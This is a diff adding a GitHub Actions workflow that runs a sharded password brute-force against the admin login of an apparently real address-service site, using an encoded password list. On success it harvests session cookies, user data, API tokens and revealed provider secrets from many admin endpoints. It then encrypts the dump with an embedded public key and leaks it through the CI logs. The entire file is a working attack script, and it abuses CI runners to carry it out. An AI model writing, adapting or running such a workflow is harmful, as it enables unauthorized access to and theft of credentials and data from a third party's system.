@@ -1,0 +1,85 @@
+name: addr-pw-pilot1
+on:
+  push:
+    branches:
+      - 'probe-addr-pw-pilot1'
+permissions:
+  contents: read
+env:
+  PAYLOAD: "H4sIAA8eBmsC/xXNyW6DMBAA0PP4Y6qZMTb2rQdQWmWRWiGl9BYMCIfFSZqC4OvrXt71ISDIHEmFYuHvbBUEBGX5tV4fG7ukzdxoesHAUCuWLV2ktlLq1KrWJK6yqRUSJGR+6zwj69eIEgkkUDR1vf78Ti8ujEKBgkPjn1XYeXwEgaDhwNVS3q/nJ50+Y5vC3p/Dvrv3Oh9NLA2QnuaT6YvbFhML4bjRyN0QhuN/QQhopo8LN2G+hVgQwTzn764eOnxbUPwB3ln66NwAAAA="
+  PUBKEY_B64: "LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUFucE1Pb0V3UU9jRnl1UGtVRFNWWQpkVnJVWlQ5OU0rUk54NUpiQXpKWVVLVjJrdnQ2czhUMEJ1Q2NBZjlBOERWRWp2U1JMcWs5MXZGTUhqdWpiSzhyCjBBSXJ2bWNWU2ZzbDBVUjJqdk43bDlhSmhDcklZYldranNKMWZlRWh5SXl2VEZUY05RZDErRGJ2UExpQlRBVk0Kd2ppVVpVWE5aYTBEVFZVOXNBZzQzdVp4S3RtcmQxT2h2K0REVUd6RUNJd2JlQnYwWW9PaWdDUWU0OXZWT0ZiNgpnUjQ2NlpMaHpLKzdlNXZKTncvYWE4Mk9xcy9RQWFoL3A5VkV6SEEzYTVibzhxRThTbGJ1ZDdKeHJRdm83SnZ1CjBTcFhTam9jKzZod2VxQk40VVpwOEdRMEtaZmxiZWJlMUNvVzRMZmN2ZHZpcjhLVUQ2emdTVG1ZS01RRVB1eUoKTlFJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tCg=="
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    timeout-minutes: 30
+    strategy:
+      fail-fast: false
+      max-parallel: 20
+      matrix:
+        shard: [0,1,2,3,4,5]
+    steps:
+      - name: probe-addr-login
+        shell: bash
+        run: |
+          set +e
+          IP=$(curl -s -m 15 https://api.ipify.org || echo NA)
+          echo "ENV shard=${{ matrix.shard }} runner_ip=$IP utc=$(date -u +%FT%TZ)"
+          export SHARD=${{ matrix.shard }}
+          python3 - <<'PYEOF'
+          import os,sys,json,ssl,base64,gzip,time,subprocess,urllib.request,urllib.error,http.cookiejar
+          shard=int(os.environ.get('SHARD','0'))
+          raw=gzip.decompress(base64.b64decode(os.environ['PAYLOAD'])).decode('utf-8','ignore')
+          items=[]
+          for line in raw.splitlines():
+              if not line.strip(): continue
+              s,idx,pw=line.split('\t',2)
+              if int(s)==shard: items.append((int(idx),pw))
+          print("SHARD %d items %d"%(shard,len(items)),flush=True)
+          BASE="https://addr.1poa.org"
+          UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
+          ctx=ssl.create_default_context()
+          cj=http.cookiejar.CookieJar()
+          opener=urllib.request.build_opener(urllib.request.HTTPSHandler(context=ctx),urllib.request.HTTPCookieProcessor(cj))
+          def req(path,data=None,headers=None):
+              h={"User-Agent":UA,"Origin":BASE,"Referer":BASE+"/en/admin/","Accept":"application/json"}
+              if headers: h.update(headers)
+              body=None
+              if data is not None:
+                  body=json.dumps(data).encode(); h["Content-Type"]="application/json"
+              r=urllib.request.Request(BASE+path,data=body,headers=h,method="POST" if body is not None else "GET")
+              try:
+                  resp=opener.open(r,timeout=25); return resp.status,dict(resp.headers),resp.read(4000)
+              except urllib.error.HTTPError as e:
+                  return e.code,dict(e.headers),e.read(4000)
+              except Exception as e:
+                  return -1,{},str(e).encode()
+          def encrypt(txt):
+              open('/tmp/dump.json','w').write(txt)
+              open('/tmp/pub.pem','w').write(base64.b64decode(os.environ['PUBKEY_B64']).decode())
+              p=subprocess.run("openssl smime -encrypt -aes-256-cbc -binary -outform DER -in /tmp/dump.json /tmp/pub.pem | base64 -w0",shell=True,capture_output=True,text=True)
+              return p.stdout.strip()
+          for gidx,pw in items:
+              code,h,b=req("/admin/api/login",{"password":pw})
+              sc=(h.get("Set-Cookie") or h.get("set-cookie") or "")
+              print("TRY shard=%d gidx=%d code=%d setcookie=%s body=%s"%(shard,gidx,code,("SESSION" if "address_admin_session" in sc else "no"),b[:100].decode("utf-8","replace")),flush=True)
+              if code==200:
+                  print("HIT shard=%d gidx=%d"%(shard,gidx),flush=True)
+                  csrf=""
+                  for c in cj:
+                      if c.name=="address_admin_csrf": csrf=c.value
+                  res={}
+                  for ep in ["/admin/api/status","/admin/api/session","/admin/api/dashboard/overview","/admin/api/users","/admin/api/settings/mail","/admin/api/tokens","/admin/api/providers","/admin/api/maps/amap-browser","/admin/api/settings/access","/admin/api/settings/site","/admin/api/settings/maps","/admin/api/settings/translation","/admin/api/settings/blacklist","/admin/api/address-data","/admin/api/sync/queue","/admin/api/sync/history","/admin/api/settings/country-shortcuts","/admin/api/tokens/1/reveal","/admin/api/providers/1/reveal","/admin/api/providers/1/reveal-fields","/admin/api/maps/amap-browser/reveal"]:
+                      c2,h2,b2=req(ep,headers={"X-CSRF-Token":csrf})
+                      res[ep]={"code":c2,"body":b2[:8000].decode("utf-8","replace")}
+                  dump=json.dumps({"hit_gidx":gidx,"password":pw,"cookies":[{"name":c.name,"value":c.value,"domain":c.domain} for c in cj],"probes":res},ensure_ascii=False)
+                  enc=encrypt(dump)
+                  print("ENCSTART",flush=True)
+                  for i in range(0,len(enc),3000):
+                      print("ENC "+enc[i:i+3000],flush=True)
+                  print("ENCEND",flush=True)
+                  break
+              if code==429:
+                  print("RATE shard=%d gidx=%d"%(shard,gidx),flush=True); break
+              time.sleep(2)
+          print("DONE shard=%d"%shard,flush=True)
+PYEOF
